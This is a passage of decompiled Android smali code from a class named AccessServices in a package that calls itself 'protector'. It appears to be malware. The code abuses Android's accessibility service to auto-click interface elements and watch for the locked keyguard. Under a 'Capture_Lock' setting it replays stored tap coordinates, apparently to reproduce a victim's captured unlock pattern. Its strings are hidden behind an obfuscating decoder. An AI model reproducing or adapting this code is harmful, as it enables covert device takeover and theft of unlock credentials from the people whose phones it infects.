    invoke-interface {v4, v3}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/graphics/Point;

    if-eqz v3, :cond_0

    iget v4, v3, Landroid/graphics/Point;->x:I

    iget v3, v3, Landroid/graphics/Point;->y:I

    invoke-static {v4, v3}, Lcom/icontrol/protector/a;->y(II)Z

    const-wide/16 v3, 0x1f4

    :try_start_0
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_0
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_1
    if-eqz p2, :cond_2

    sget-object p1, Lcom/icontrol/protector/AccessServices;->R:Ljava/util/Map;

    const/4 p2, -0x1

    invoke-static {p2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p2

    invoke-interface {p1, p2}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/graphics/Point;

    if-eqz p1, :cond_2

    iget p2, p1, Landroid/graphics/Point;->x:I

    iget p1, p1, Landroid/graphics/Point;->y:I

    invoke-static {p2, p1}, Lcom/icontrol/protector/a;->y(II)Z

    :cond_2
    invoke-static {}, Lcom/icontrol/protector/a;->T()Lcom/icontrol/protector/AccessServices;

    sput-boolean v1, Lcom/icontrol/protector/AccessServices;->A:Z

    return-void
.end method

.method public m()V
    .locals 6

    .line 1
    iget-boolean v0, p0, Lcom/icontrol/protector/AccessServices;->m:Z

    if-eqz v0, :cond_0

    return-void

    :cond_0
    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/icontrol/protector/AccessServices;->m:Z

    :try_start_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getServiceInfo()Landroid/accessibilityservice/AccessibilityServiceInfo;

    move-result-object v0

    iget v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->flags:I

    or-int/lit8 v1, v1, 0x4

    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->flags:I

    invoke-virtual {p0, v0}, Landroid/accessibilityservice/AccessibilityService;->setServiceInfo(Landroid/accessibilityservice/AccessibilityServiceInfo;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :try_start_1
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1e

    if-lt v0, v1, :cond_1

    new-instance v0, Landroid/graphics/Region;

    invoke-direct {v0}, Landroid/graphics/Region;-><init>()V

    new-instance v1, Landroid/graphics/Rect;

    iget v2, p0, Lcom/icontrol/protector/AccessServices;->h:I

    add-int/lit16 v3, v2, -0xc8

    iget v4, p0, Lcom/icontrol/protector/AccessServices;->g:I

    const/4 v5, 0x0

    invoke-direct {v1, v5, v3, v4, v2}, Landroid/graphics/Rect;-><init>(IIII)V

    sget-object v2, Landroid/graphics/Region$Op;->UNION:Landroid/graphics/Region$Op;

    invoke-virtual {v0, v1, v2}, Landroid/graphics/Region;->op(Landroid/graphics/Rect;Landroid/graphics/Region$Op;)Z

    invoke-virtual {p0, v5, v0}, Lcom/icontrol/protector/AccessServices;->setTouchExplorationPassthroughRegion(ILandroid/graphics/Region;)V

    invoke-virtual {p0, v5, v0}, Lcom/icontrol/protector/AccessServices;->setGestureDetectionPassthroughRegion(ILandroid/graphics/Region;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :cond_1
    return-void
.end method

.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 28

    move-object/from16 v7, p0

    const-string v8, ""

    new-instance v1, Ljava/text/SimpleDateFormat;

    const/16 v2, 0x13

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    const/16 v9, 0x8

    new-array v3, v9, [B

    fill-array-data v3, :array_1

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    new-instance v2, Ljava/util/Date;

    invoke-direct {v2}, Ljava/util/Date;-><init>()V

    invoke-virtual {v1, v2}, Ljava/text/DateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v10

    const/4 v11, 0x7

    new-array v1, v11, [B

    fill-array-data v1, :array_2

    new-array v2, v9, [B

    fill-array-data v2, :array_3

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v2

    const v3, 0x8000

    const/16 v4, 0x10

    const/16 v5, 0x80

    if-eq v2, v3, :cond_0

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v2

    if-eq v2, v5, :cond_0

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v2

    const/high16 v3, 0x100000

    if-ne v2, v3, :cond_1

    :cond_0
    :try_start_0
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-eqz v2, :cond_1

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_1

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v2

    sget-object v3, Lcom/icontrol/protector/AccessServices;->I:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_1

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lcom/icontrol/protector/AccessServices;->I:Ljava/lang/String;

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    invoke-virtual {v2, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->recycle()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception v0

    move-object v2, v0

    invoke-virtual {v2}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_1
    :try_start_1
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v2

    if-eqz v2, :cond_2

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v2

    if-lez v2, :cond_2

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_0

    :cond_2
    move-object v2, v8

    :goto_0
    move-object v13, v2

    goto :goto_1

    :catch_1
    const/4 v13, 0x0

    :goto_1
    :try_start_2
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    move-object v14, v2

    goto :goto_2

    :catch_2
    const/4 v14, 0x0

    :goto_2
    :try_start_3
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    goto :goto_3

    :catch_3
    const/4 v2, 0x0

    :goto_3
    const/16 v3, 0x17

    if-eqz v14, :cond_3

    :try_start_4
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getClassName()Ljava/lang/CharSequence;

    move-result-object v6

    if-eqz v6, :cond_3

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getClassName()Ljava/lang/CharSequence;

    move-result-object v6

    invoke-interface {v6}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v6

    new-array v15, v3, [B

    fill-array-data v15, :array_4

    new-array v12, v9, [B

    fill-array-data v12, :array_5

    invoke-static {v15, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v6, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_3

    sput-object v14, Lcom/icontrol/protector/AccessServices;->H:Landroid/view/accessibility/AccessibilityNodeInfo;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    :catch_4
    :cond_3
    :try_start_5
    sget-object v6, Lcom/icontrol/protector/AccessServices;->B:Ljava/lang/Boolean;

    invoke-virtual {v6}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v6

    if-eqz v6, :cond_4

    sget-object v6, Lcom/icontrol/protector/AccessServices;->H:Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v6, :cond_4

    sget v6, Landroid/os/Build$VERSION;->SDK_INT:I
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_6

    const/16 v12, 0x1e

    if-lt v6, v12, :cond_4

    :try_start_6
    sget-object v6, Lcom/icontrol/protector/AccessServices;->H:Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-static {}, Lntidisestablish/neumonoul/floccinaucinih/w0;->a()Landroid/view/accessibility/AccessibilityNodeInfo$AccessibilityAction;

    move-result-object v12

    invoke-virtual {v12}, Landroid/view/accessibility/AccessibilityNodeInfo$AccessibilityAction;->getId()I

    move-result v12

    invoke-virtual {v6, v12}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    sget-object v6, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    sput-object v6, Lcom/icontrol/protector/AccessServices;->B:Ljava/lang/Boolean;
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_5

    goto :goto_4

    :catch_5
    move-exception v0

    move-object v6, v0

    :try_start_7
    invoke-virtual {v6}, Ljava/lang/Throwable;->printStackTrace()V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_6

    :catch_6
    :cond_4
    :goto_4
    const/16 v6, 0x14

    const/4 v12, 0x2

    const/16 v3, 0xd

    const/16 v18, 0x0

    const/4 v5, 0x1

    :try_start_8
    sget-object v20, Lcom/icontrol/protector/AccessServices;->D:Ljava/lang/Boolean;

    invoke-virtual/range {v20 .. v20}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v20
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_8

    if-eqz v20, :cond_e

    :try_start_9
    new-array v11, v9, [B

    fill-array-data v11, :array_6

    new-array v4, v9, [B

    fill-array-data v4, :array_7

    invoke-static {v11, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v7, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/app/KeyguardManager;

    invoke-virtual {v4}, Landroid/app/KeyguardManager;->isKeyguardLocked()Z

    move-result v4

    if-eqz v4, :cond_5

    sget-object v4, Lcom/icontrol/protector/AccessServices;->C:Ljava/lang/Boolean;

    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_5

    sget-object v4, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    sput-object v4, Lcom/icontrol/protector/AccessServices;->E:Ljava/lang/Boolean;
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_9

    :try_start_a
    sget-object v4, Lcom/icontrol/protector/My_Configs;->Capture_Lock:Ljava/lang/String;

    new-array v11, v5, [B

    const/16 v21, -0x44

    aput-byte v21, v11, v18

    new-array v15, v9, [B

    fill-array-data v15, :array_8

    invoke-static {v11, v15}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v4, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_e

    sget-boolean v4, Lcom/icontrol/protector/AccessServices;->A:Z

    if-nez v4, :cond_e

    invoke-direct/range {p0 .. p1}, Lcom/icontrol/protector/AccessServices;->i(Landroid/view/accessibility/AccessibilityEvent;)V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_7

    goto/16 :goto_8

    :catch_7
    :try_start_b
    new-array v4, v3, [B

    fill-array-data v4, :array_9

    new-array v11, v9, [B

    fill-array-data v11, :array_a

    invoke-static {v4, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    new-array v4, v6, [B

    fill-array-data v4, :array_b

    new-array v11, v9, [B

    fill-array-data v11, :array_c

    invoke-static {v4, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    goto/16 :goto_8

    :cond_5
    sget-object v4, Lcom/icontrol/protector/AccessServices;->E:Ljava/lang/Boolean;

    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_6

    sget-object v4, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    sput-object v4, Lcom/icontrol/protector/AccessServices;->E:Ljava/lang/Boolean;

    invoke-virtual/range {p0 .. p0}, Lcom/icontrol/protector/AccessServices;->j()V

    :cond_6
    sget-object v4, Lcom/icontrol/protector/AccessServices;->C:Ljava/lang/Boolean;

    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_e

    sget-object v4, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    sput-object v4, Lcom/icontrol/protector/AccessServices;->C:Ljava/lang/Boolean;

    sput-object v4, Lcom/icontrol/protector/AccessServices;->D:Ljava/lang/Boolean;

    sput-boolean v18, Lcom/icontrol/protector/AccessServices;->A:Z

    invoke-virtual/range {p0 .. p0}, Lcom/icontrol/protector/AccessServices;->j()V

    sget-object v4, Lcom/icontrol/protector/AccessServices;->S:Ljava/lang/String;

    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v11

    const/16 v15, 0xdf1

    if-eq v11, v15, :cond_9

    const/16 v15, 0xdf9

    if-eq v11, v15, :cond_8

    const/16 v15, 0xe04

    if-eq v11, v15, :cond_7

    goto :goto_5

    :cond_7
    new-array v11, v12, [B

    fill-array-data v11, :array_d

    new-array v15, v9, [B

    fill-array-data v15, :array_e

    invoke-static {v11, v15}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v4, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_a

    move v4, v5

    goto :goto_6

    :cond_8
    new-array v11, v12, [B

    fill-array-data v11, :array_f

    new-array v15, v9, [B

    fill-array-data v15, :array_10

    invoke-static {v11, v15}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v4, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_a

    move v4, v12

    goto :goto_6

    :cond_9
    new-array v11, v12, [B

    fill-array-data v11, :array_11

    new-array v15, v9, [B

    fill-array-data v15, :array_12

    invoke-static {v11, v15}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v4, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_a

    move/from16 v4, v18

    goto :goto_6

    :cond_a
    :goto_5
    const/4 v4, -0x1

    :goto_6
    if-eqz v4, :cond_d

    if-eq v4, v5, :cond_c

    if-eq v4, v12, :cond_b

    const/16 v4, 0x11

    new-array v4, v4, [B

    fill-array-data v4, :array_13

    new-array v11, v9, [B

    fill-array-data v11, :array_14

    invoke-static {v4, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    goto/16 :goto_8

    :cond_b
    sget-object v4, Lntidisestablish/neumonoul/floccinaucinih/ab;->O:Ljava/lang/String;

    invoke-static {v7, v4, v8}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    sget-object v11, Lcom/icontrol/protector/AccessServices;->O:Ljava/lang/String;

    invoke-virtual {v11}, Ljava/lang/String;->length()I

    move-result v11

    if-lez v11, :cond_e

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v15, 0x3

    new-array v6, v15, [B

    fill-array-data v6, :array_15

    new-array v15, v9, [B

    fill-array-data v15, :array_16

    invoke-static {v6, v15}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v11, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Lcom/icontrol/protector/AccessServices;->O:Ljava/lang/String;

    invoke-virtual {v11, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_e

    sget-object v4, Lntidisestablish/neumonoul/floccinaucinih/ab;->O:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v11, 0x3

    new-array v15, v11, [B

    fill-array-data v15, :array_17

    new-array v11, v9, [B

    fill-array-data v11, :array_18

    invoke-static {v15, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v6, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v11, Lcom/icontrol/protector/AccessServices;->O:Ljava/lang/String;

    invoke-virtual {v6, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v7, v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/sq;->e(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const/16 v4, 0x10

    new-array v4, v4, [B

    fill-array-data v4, :array_19

    new-array v6, v9, [B

    fill-array-data v6, :array_1a

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    sput-object v8, Lcom/icontrol/protector/AccessServices;->O:Ljava/lang/String;

    new-instance v4, Ljava/util/HashMap;

    sget-object v6, Lcom/icontrol/protector/AccessServices;->Q:Ljava/util/Map;

    invoke-direct {v4, v6}, Ljava/util/HashMap;-><init>(Ljava/util/Map;)V

    sput-object v4, Lcom/icontrol/protector/AccessServices;->R:Ljava/util/Map;

    :goto_7
    sget-object v4, Lcom/icontrol/protector/AccessServices;->Q:Ljava/util/Map;

    invoke-interface {v4}, Ljava/util/Map;->clear()V

    goto/16 :goto_8

    :cond_c
    sget-object v4, Lntidisestablish/neumonoul/floccinaucinih/ab;->O:Ljava/lang/String;

    invoke-static {v7, v4, v8}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    sget-object v6, Lcom/icontrol/protector/AccessServices;->P:Ljava/lang/String;

    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v6

    if-lez v6, :cond_e

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v11, 0x3

    new-array v15, v11, [B

    fill-array-data v15, :array_1b

    new-array v11, v9, [B

    fill-array-data v11, :array_1c

    invoke-static {v15, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v6, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v11, Lcom/icontrol/protector/AccessServices;->P:Ljava/lang/String;

    invoke-virtual {v6, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_e

    sget-object v4, Lntidisestablish/neumonoul/floccinaucinih/ab;->O:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v11, 0x3

    new-array v15, v11, [B

    fill-array-data v15, :array_1d

    new-array v11, v9, [B

    fill-array-data v11, :array_1e

    invoke-static {v15, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v6, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v11, Lcom/icontrol/protector/AccessServices;->P:Ljava/lang/String;

    invoke-virtual {v6, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v7, v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/sq;->e(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-instance v4, Ljava/util/HashMap;

    sget-object v6, Lcom/icontrol/protector/AccessServices;->Q:Ljava/util/Map;

    invoke-direct {v4, v6}, Ljava/util/HashMap;-><init>(Ljava/util/Map;)V

    sput-object v4, Lcom/icontrol/protector/AccessServices;->R:Ljava/util/Map;

    sput-object v8, Lcom/icontrol/protector/AccessServices;->P:Ljava/lang/String;

    goto :goto_7

    :cond_d
    sget-object v4, Lntidisestablish/neumonoul/floccinaucinih/ab;->O:Ljava/lang/String;

    invoke-static {v7, v4, v8}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    sget-object v6, Lcom/icontrol/protector/AccessServices;->U:Ljava/lang/String;

    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v6

    if-lez v6, :cond_e

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v11, 0x3

    new-array v15, v11, [B

    fill-array-data v15, :array_1f

    new-array v11, v9, [B

    fill-array-data v11, :array_20

    invoke-static {v15, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v6, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v11, Lcom/icontrol/protector/AccessServices;->U:Ljava/lang/String;

    invoke-virtual {v6, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_e

    sget-object v4, Lntidisestablish/neumonoul/floccinaucinih/ab;->O:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v11, 0x3

    new-array v15, v11, [B

    fill-array-data v15, :array_21

    new-array v11, v9, [B

    fill-array-data v11, :array_22

    invoke-static {v15, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v6, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v11, Lcom/icontrol/protector/AccessServices;->U:Ljava/lang/String;

    invoke-virtual {v6, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v7, v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/sq;->e(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const/16 v4, 0x1a

    new-array v4, v4, [B

    fill-array-data v4, :array_23

    new-array v6, v9, [B

    fill-array-data v6, :array_24

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    new-instance v4, Ljava/util/HashMap;

    sget-object v6, Lcom/icontrol/protector/AccessServices;->Q:Ljava/util/Map;

    invoke-direct {v4, v6}, Ljava/util/HashMap;-><init>(Ljava/util/Map;)V

    sput-object v4, Lcom/icontrol/protector/AccessServices;->R:Ljava/util/Map;

    sput-object v8, Lcom/icontrol/protector/AccessServices;->U:Ljava/lang/String;
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_9

    goto/16 :goto_7

    :catch_8
    move-exception v0

    move-object v4, v0

    invoke-virtual {v4}, Ljava/lang/Throwable;->printStackTrace()V

    :catch_9
    :cond_e
    :goto_8
    :try_start_c
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_a

    goto :goto_9

    :catch_a
    move-object v4, v8

    :goto_9
    const/16 v11, 0xa

    const/16 v15, 0x9

    const/4 v6, 0x6

    :try_start_d
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v3

    const/16 v12, 0x4000

    if-ne v3, v12, :cond_15

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v3

    if-eqz v3, :cond_22

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v4

    sparse-switch v4, :sswitch_data_0

    goto :goto_a

    :sswitch_0
    new-array v4, v15, [B

    fill-array-data v4, :array_25

    new-array v12, v9, [B

    fill-array-data v12, :array_26

    invoke-static {v4, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_f

    move/from16 v3, v18

    goto :goto_b

    :catch_b
    move-exception v0

    move-object v3, v0

    goto/16 :goto_f

    :sswitch_1
    new-array v4, v11, [B

    fill-array-data v4, :array_27

    new-array v12, v9, [B

    fill-array-data v12, :array_28

    invoke-static {v4, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_f

    move v3, v5

